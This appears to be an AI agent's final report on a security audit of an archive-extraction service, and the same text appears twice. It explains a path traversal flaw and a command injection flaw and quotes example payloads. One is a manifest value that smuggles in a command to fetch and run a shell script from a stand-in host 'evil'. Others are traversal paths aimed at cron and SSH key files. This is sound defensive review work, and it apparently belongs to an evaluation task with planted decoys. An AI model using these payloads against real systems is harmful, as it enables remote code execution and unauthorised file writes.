The security review is complete. The report `SECURITY_REVIEW.json` is valid and no audited source files were modified (git diff is empty — only the new report was added).

## Summary

I reviewed all 10 source files in the repository (an archive-extraction service). I found **2 CRITICAL exploitable findings**, both reachable by any authenticated uploader via `routes/upload.js`:

### 1. Path traversal / arbitrary file write (`src/archive/extract.js`)
Every archive entry is written to `path.join(destination, entry.name)` with no containment. `path.join` collapses `..` segments, so an entry like `../../etc/cron.d/evil` or `../../../home/u/.ssh/authorized_keys` escapes the destination directory. Combined with `fs.mkdirSync(..., {recursive:true})` and `fs.writeFileSync(output, entry.data)`, an attacker writes attacker-controlled bytes to arbitrary paths. A correct `safeOutput()` helper exists in `safe-extract.js` but is **never imported** (a decoy), and `limits.js` only checks entry count/size, not paths. I verified the traversal behavior empirically.

### 2. Command injection / RCE (`src/archive/hooks.js` + `src/archive/extract.js`)
After extraction, `extract()` runs `runHook(archive.manifest.postExtract)` where `manifest.postExtract` is attacker-supplied (embedded in the uploaded archive). `runHook` calls `exec('sh ' + script)` with no validation, so a manifest value like `x; curl http://evil/sh | sh #` executes arbitrary shell commands as the service user. A safe `runApproved()` (allowlist + `spawn` with `shell:false`) exists in `safe-hook.js` but is **never used** — another decoy.

### Decoys correctly excluded
I deliberately did **not** report `safe-extract.js` (proper containment, unused) or `safe-hook.js` (proper allowlisted spawn, unused) as findings — they're defenses that exist but aren't wired in. I also didn't report `extensions.js`'s allowlist (unused but not a vulnerability), `status.js` (no untrusted input), or `limits.js` (size checks are functional, not security-bypassing). No dependency metadata or secrets were present in the repository.

The security review is complete. The report `SECURITY_REVIEW.json` is valid and no audited source files were modified (git diff is empty — only the new report was added).

I reviewed all 10 source files in the repository (an archive-extraction service). I found **2 CRITICAL exploitable findings**, both reachable by any authenticated uploader via `routes/upload.js`:

### 1. Path traversal / arbitrary file write (`src/archive/extract.js`)
Every archive entry is written to `path.join(destination, entry.name)` with no containment. `path.join` collapses `..` segments, so an entry like `../../etc/cron.d/evil` or `../../../home/u/.ssh/authorized_keys` escapes the destination directory. Combined with `fs.mkdirSync(..., {recursive:true})` and `fs.writeFileSync(output, entry.data)`, an attacker writes attacker-controlled bytes to arbitrary paths. A correct `safeOutput()` helper exists in `safe-extract.js` but is **never imported** (a decoy), and `limits.js` only checks entry count/size, not paths. I verified the traversal behavior empirically.

### 2. Command injection / RCE (`src/archive/hooks.js` + `src/archive/extract.js`)
After extraction, `extract()` runs `runHook(archive.manifest.postExtract)` where `manifest.postExtract` is attacker-supplied (embedded in the uploaded archive). `runHook` calls `exec('sh ' + script)` with no validation, so a manifest value like `x; curl http://evil/sh | sh #` executes arbitrary shell commands as the service user. A safe `runApproved()` (allowlist + `spawn` with `shell:false`) exists in `safe-hook.js` but is **never used** — another decoy.

### Decoys correctly excluded
I deliberately did **not** report `safe-extract.js` (proper containment, unused) or `safe-hook.js` (proper allowlisted spawn, unused) as findings — they're defenses that exist but aren't wired in. I also didn't report `extensions.js`'s allowlist (unused but not a vulnerability), `status.js` (no untrusted input), or `limits.js` (size checks are functional, not security-bypassing). No dependency metadata or secrets were present in the repository.
